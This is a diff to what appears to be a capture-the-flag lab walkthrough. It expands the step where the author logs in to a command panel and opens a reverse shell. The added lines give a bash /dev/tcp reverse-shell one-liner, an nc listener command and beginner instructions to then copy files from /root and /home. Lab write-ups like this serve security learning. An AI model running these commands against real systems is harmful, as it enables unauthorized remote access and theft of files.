@@ -45,7 +45,15 @@ HOP RTT       ADDRESS
 
 #login.php
 `with the creds we log in and there is a command pannel, yesssss! literally command pannel so we get a reverse shell`
-                       bash -c "bash -i >& /dev/tcp/your-ip/8000 0>&1"
+                       bash -c "bash -i >& /dev/tcp/your-ip/listening-port 0>&1"
+
+  ***  FOR BEGINNERS ***
+(after you login...)
+FIRST = nc -lvnp (listening-port) //run this on your terminal
+SECOND = bash -c "bash -i >& /dev/tcp/your-ip/listening-port 0>&1" //run this on the command pannel
+
+`make sure to run this in this sequence as you need to start a listener[FIRST CMD] beforre firing your payloads[SECOND CMD]`
+ THEN get the files from /root directory and /home/name directory 
 
 # priv.esc
-= none.. haha you are already root this is a basic lab so just go and find the flags haha.
+= none..  you are already root , this is a basic lab so just go and find the flags haha.
